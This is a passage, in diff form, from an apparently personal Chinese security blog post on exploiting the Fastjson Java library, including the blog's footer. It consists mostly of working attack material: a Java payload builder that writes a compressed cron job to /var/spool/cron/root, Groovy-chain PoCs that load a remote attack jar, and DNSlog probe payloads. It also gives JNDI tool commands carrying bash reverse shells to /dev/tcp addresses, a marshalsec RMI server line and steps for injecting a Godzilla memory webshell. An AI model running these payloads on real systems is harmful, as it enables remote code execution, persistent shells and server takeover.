+        		+ &#34;                \&#34;array\&#34;:\&#34;&#34;+code+&#34;\&#34;,\r\n&#34;
+        		+ &#34;                \&#34;limit\&#34;:1999\r\n&#34;
+        		+ &#34;            }\r\n&#34;
+        		+ &#34;        },\r\n&#34;
+        		+ &#34;        \&#34;bufLen\&#34;:1048576\r\n&#34;
+        		+ &#34;    },\r\n&#34;
+        		+ &#34;    \&#34;protocolVersion\&#34;:1\r\n&#34;
+        		+ &#34;}\r\n&#34;
+        		+ &#34;&#34;;
+        
+        System.out.println(payload);
+        JSON.parseObject(payload);
+    }
+    public static String gzcompress(String code) {
+    	byte[] data = code.getBytes();
+        byte[] output = new byte[0];
+        Deflater compresser = new Deflater();
+        compresser.reset();
+        compresser.setInput(data);
+        compresser.finish();
+        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
+        try {
+            byte[] buf = new byte[1024];
+            while (!compresser.finished()) {
+                int i = compresser.deflate(buf);
+                bos.write(buf, 0, i);
+            }
+            output = bos.toByteArray();
+        } catch (Exception e) {
+            output = data;
+            e.printStackTrace();
+        } finally {
+            try {
+                bos.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        compresser.end();
+        System.out.println(Arrays.toString(output));
+        return Base64.getEncoder().encodeToString(output);
+    }
+</code></pre><p>payload:</p><pre tabindex=0><code>
+{
+    &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;java.lang.AutoCloseable&#34;,
+    &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;sun.rmi.server.MarshalOutputStream&#34;,
+    &#34;out&#34;:
+    {
+        &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;java.util.zip.InflaterOutputStream&#34;,
+        &#34;out&#34;:
+        {
+           &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;java.io.FileOutputStream&#34;,
+           &#34;file&#34;:&#34;/var/spool/cron/root&#34;,
+           &#34;append&#34;:false
+        },
+        &#34;infl&#34;:
+        {
+            &#34;input&#34;:
+            {
+                &#34;array&#34;:&#34;eJzTUtCCQoWkxOIMBd1MBTs1Bf2U1DL9kuQCfUMDPWMDPQM9CxN9SyBQMLBTM1TgAgBAXQuq&#34;,
+                &#34;limit&#34;:1999
+            }
+        },
+        &#34;bufLen&#34;:1048576
+    },
+    &#34;protocolVersion&#34;:1
+}
+</code></pre><p>最后还要修改</p><h3 id=327-groovy-链>3.2.7 Groovy 链<a hidden class=anchor aria-hidden=true href=#327-groovy-链>#</a></h3><p>该链普遍认为是fastjson1.2.76-1.2.80较为可能达成的链子。</p><p>poc:</p><p>1、</p><pre tabindex=0><code>{
+    &#34;@type&#34;:&#34;java.lang.Exception&#34;,
+    &#34;@type&#34;:&#34;org.codehaus.groovy.control.CompilationFailedException&#34;,
+    &#34;unit&#34;:{}
+}
+</code></pre><p>2、</p><pre tabindex=0><code>{
+    &#34;@type&#34;:&#34;org.codehaus.groovy.control.ProcessingUnit&#34;,
+    &#34;@type&#34;:&#34;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&#34;,
+    &#34;config&#34;:{
+        &#34;@type&#34;:&#34;org.codehaus.groovy.control.CompilerConfiguration&#34;,
+        &#34;classpathList&#34;:&#34;http://127.0.0.1:81/attack-1.jar&#34;
+    }
+}
+</code></pre><p>还有其他链可以参考下文</p><h1 id=三漏洞利用><strong>三、漏洞利用</strong><a hidden class=anchor aria-hidden=true href=#三漏洞利用>#</a></h1><p><a href=https://github.com/safe6Sec/Fastjson>https://github.com/safe6Sec/Fastjson</a></p><p><a href=https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md>https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md</a></p><p>FastJson漏洞，从2017年爆出以来，从最初的1.2.24版本到比较新的1.2.83 2022年，已经经历了较多版本，1.2.24之前版本可以做到通杀，且没黑白名单机制，而后在1.2.25中设置了默认不开启
+autotype，1.2.47出现了不开启autotype的利用方式，且通杀。 基于漫长的历史时间，不同的版本存在不同的黑白名单机制，利用链也天差地别，所以黑盒测试中确定FastJson版本可能是能决定是否能成功利用的关键动作之一。</p><p>除开报错直接返回准确版本之外，探测方式主要为两种：一种为延迟探测，一种为DNSlog探测，这里只记录几个关键RCE版本</p><h1 id=四dns探测>四、DNS探测<a hidden class=anchor aria-hidden=true href=#四dns探测>#</a></h1><p>可用于探测是否访问DNS，但无法确定是否存在反序列化</p><pre tabindex=0><code>{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}
+{{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}:&#34;x&#34;}
+{&#34;@type&#34;:&#34;java.net.InetAddress&#34;,&#34;val&#34;:&#34;dnslog&#34;}
+{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;dnslog&#34;}
+{&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;dnslog&#34;}
+{{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;dnslog&#34;}:&#34;aaa&#34;}
+{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://dnslog&#34;}}&#34;&#34;}
+Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}]
+Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}
+{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;dnslog&#34;}}
+{{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}:0
+</code></pre><h1 id=五不出网利用>五、不出网利用<a hidden class=anchor aria-hidden=true href=#五不出网利用>#</a></h1><p>前言：不出网利用，通常是</p><p>1、写静态文件</p><p>2、写webshell，前提知道路径</p><p>3、内存马</p><p>4、dns外带</p><p>5、利用tomcat\Spring等中间件进行回显</p><p>常见的可用链：</p><pre tabindex=0><code>1、BasicDataSource链
+2、C3P0 hexbase的链
+3、TemplatesImpl链
+4、commons-io写webshell 或者读一些敏感文件
+</code></pre><h1 id=六自动化工具复现>六、自动化工具复现<a hidden class=anchor aria-hidden=true href=#六自动化工具复现>#</a></h1><p>java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 &ldquo;bash -i >&/dev/tcp/192.168.2.40/9999 0>&amp;1&rdquo;</p><p>java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 &ldquo;bash -i >&/dev/tcp/1.14.74.119/8888 0>&amp;1&rdquo;</p><p>恶意类启动建议使用：</p><pre tabindex=0><code>https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar
+</code></pre><p>POC建议使用：</p><pre tabindex=0><code>https://github.com/zhzyker/exphub/tree/946405b3447dbaf2a5eb49e2f56ec33fe1165e49/fastjson
+</code></pre><p>值得注意的几个大版本，1.2.24 通杀、1.2.47 ，这两个可以进行JNDI注入反弹shell，1.2.68版本很难使用JNDI注入了，所以常用写文件的方式进行RCE，1.2.80版本同理，受益于浅蓝大佬的公开，得以使用，但实战利用条件同样苛刻。</p><h1 id=七内存马注入>七、内存马注入<a hidden class=anchor aria-hidden=true href=#七内存马注入>#</a></h1><h2 id=1jndi注入内存马>1、JNDI注入内存马：<a hidden class=anchor aria-hidden=true href=#1jndi注入内存马>#</a></h2><p>生成哥斯拉内存马：</p><p><img loading=lazy src=/zj_img/WEBRESOURCE2252676750d37c1b9814059859c54283image.png alt></p><p>开启http服务：</p><p><img loading=lazy src=/zj_img/WEBRESOURCE952f2dc8aa7ade6cd6478f775b671407image.png alt></p><p>开启rmi服务，注意最好使用jdk 8</p><pre tabindex=0><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &#34;http://192.168.5.106:8888/#a&#34; 9999
+</code></pre><p><img loading=lazy src=/zj_img/WEBRESOURCEe255eed7da6b57489997a9b1199f33b2image.png alt></p><p>添加密码和密钥,Referer:连接即可：</p><p><img loading=lazy src=/zj_img/WEBRESOURCE30348d3b989d57b7e692fc6e9039b536image.png alt></p><h2 id=2c3p0-内存马注入>2、C3P0 内存马注入<a hidden class=anchor aria-hidden=true href=#2c3p0-内存马注入>#</a></h2><p>参见3.2.5</p><h2 id=3bcel注入>3、BCEL注入<a hidden class=anchor aria-hidden=true href=#3bcel注入>#</a></h2><h2 id=4写文件charsetsjar注入>4、写文件charsets.jar注入<a hidden class=anchor aria-hidden=true href=#4写文件charsetsjar注入>#</a></h2><p>这种方法属于是对计划任务不出网的一种补充，但是实操难度较高。</p><p><a href=https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks>https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p><h2 id=5classes>5、classes<a hidden class=anchor aria-hidden=true href=#5classes>#</a></h2><p><a href=https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/>https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/</a></p><h1 id=八fastjsonparty>八、FastJsonParty<a hidden class=anchor aria-hidden=true href=#八fastjsonparty>#</a></h1><p><a href=https://github.com/lemono0/FastJsonParty>https://github.com/lemono0/FastJsonParty</a></p><p>该靶场是目前fastjson的集大成内容，主要涉及各大利用链、版本识别、版本绕过等。</p><h1 id=九fastjson的识别这里只探讨识别不涉及版本判断>九、fastjson的识别，这里只探讨识别，不涉及版本判断<a hidden class=anchor aria-hidden=true href=#九fastjson的识别这里只探讨识别不涉及版本判断>#</a></h1><p>1、当返回的内容中带有fastjson字样时判断为使用了fastjson，这种应该是框架抛出的；</p><p>2、当报错格式大概为以下格式的时候，很大程度可能使用了fastjson；</p><p><img loading=lazy src=/zj_img/WEBRESOURCEdec9d15b82f605a95d9d1ea941be1d44image.png alt></p><p>3、type=Internal Server Error, status=500，这种也是框架抛出的</p><p>4、一些特殊的payload</p><p>该payload可能导致抛出fastjson版本：</p><pre tabindex=0><code>{&#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;
+[&#34;test&#34;:1] 
+</code></pre><p>解码hex和unicode编码</p><pre tabindex=0><code>{&#34;\u0040\u0074\u0079\u0070\u0065&#34;: &#34;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0041\u0075\u0074\u006F\u0043\u006C\u006F\u0073\u0065\u0061\u0062\u006C\u0065&#34;
+</code></pre><p>5、这个payload 可能出现 autoType is not support. whatever</p><pre tabindex=0><code>{&#34;@type&#34;:&#34;whatever&#34;}
+</code></pre><h1 id=十其他>十、其他<a hidden class=anchor aria-hidden=true href=#十其他>#</a></h1><p>依赖链判断方法：</p><pre tabindex=0><code>{
+  &#34;x&#34;: {
+    &#34;@type&#34;: &#34;java.lang.Character&#34;{
+  &#34;@type&#34;: &#34;java.lang.Class&#34;,
+  &#34;val&#34;: &#34;org.springframework.web.bind.annotation.RequestMapping&#34;
+		}
+	}
+</code></pre><p><img loading=lazy src=/zj_img/WEBRESOURCE4b6ec0d9edb65a056bd95c0d8c1e5abfimage.png alt></p><p>绕过：</p><pre tabindex=0><code>https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/
+</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/vulnhub/0x080-fristileaks1.3/><span class=title>« Prev</span><br><span>0x080 FristiLeaks1.3</span>
+</a><a class=next href=http://localhost:1313/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/><span class=title>Next »</span><br><span>kali 环境爬坑</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
